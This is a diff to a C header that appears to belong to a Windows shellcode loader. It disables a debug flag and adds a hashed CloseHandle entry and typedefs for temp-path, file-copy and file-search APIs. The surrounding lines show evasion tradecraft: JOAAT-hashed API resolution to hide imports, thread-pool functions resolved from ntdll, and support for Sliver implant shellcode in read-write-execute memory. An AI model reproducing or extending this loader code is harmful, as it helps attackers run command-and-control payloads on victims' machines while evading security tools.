@@ -11,7 +11,7 @@
 
 // ----------- Build Config -----------
 // Uncomment for debug output (log file)
-#define DEBUG
+// #define DEBUG
 
 // Uncomment for Go-based shellcode (Sliver) that writes to own pages.
 // When defined: memory is PAGE_EXECUTE_READWRITE.
@@ -51,6 +51,7 @@
 #define ReadFile_JOAAT                  0x62BF1D54
 #define WriteFile_JOAAT                 0x8CFB9E0E
 #define SetFilePointer_JOAAT            0xCF8699F2
+#define CloseHandle_JOAAT               0x8FA1D581
 
 // ----------- Thread Pool Hashes (ntdll exports, resolved via FetchExportAddress) -----------
 #define TpAllocWork_JOAAT               0xE6CACAE7
@@ -105,6 +106,13 @@ typedef BOOL    (WINAPI* fnRollbackTransaction)(HANDLE);
 typedef BOOL    (WINAPI* fnReadFile)(HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED);
 typedef BOOL    (WINAPI* fnWriteFile2)(HANDLE, LPCVOID, DWORD, LPDWORD, LPOVERLAPPED);
 typedef DWORD   (WINAPI* fnSetFilePointer)(HANDLE, LONG, PLONG, DWORD);
+typedef BOOL    (WINAPI* fnCloseHandle2)(HANDLE);
+typedef DWORD   (WINAPI* fnGetTempPathA2)(DWORD, LPSTR);
+typedef BOOL    (WINAPI* fnCopyFileA2)(LPCSTR, LPCSTR, BOOL);
+typedef HANDLE  (WINAPI* fnFindFirstFileA2)(LPCSTR, LPWIN32_FIND_DATAA);
+typedef BOOL    (WINAPI* fnFindNextFileA2)(HANDLE, LPWIN32_FIND_DATAA);
+typedef BOOL    (WINAPI* fnFindClose2)(HANDLE);
+typedef HANDLE  (WINAPI* fnCreateFileA2)(LPCSTR, DWORD, DWORD, LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE);
 
 // ----------- Resolved WinAPI Function Pointers -----------
 typedef struct _API_HASHING {
